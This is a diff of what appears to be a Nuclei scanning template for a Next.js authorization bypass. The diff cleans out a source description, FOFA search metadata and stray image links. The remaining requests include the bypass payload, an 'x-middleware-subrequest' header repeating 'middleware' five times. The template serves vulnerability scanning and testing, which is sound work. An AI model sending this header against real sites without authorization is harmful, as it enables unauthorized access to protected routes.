@@ -3,12 +3,8 @@ info:
   name: Next.Js 权限绕过漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cb8mctez70yr9n0y'
+  description: ''
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cb8mctez70yr9n0y
-    fofa: body="/_next/static"
 http:
 - raw:
   - 'GET / HTTP/1.1
@@ -19,7 +15,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    Connection: close![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742997223165-483c1ecb-4182-4e82-bfe6-dd835b33992d.png)
+    Connection: close
 
     增加header实现绕过'
   redirects: false
@@ -34,9 +30,7 @@ http:
 
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
 
-    x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742997223406-dcb10b99-843d-450d-863d-1f60a61cf5de.png)'
+    x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
   redirects: false
   matchers:
   - status:
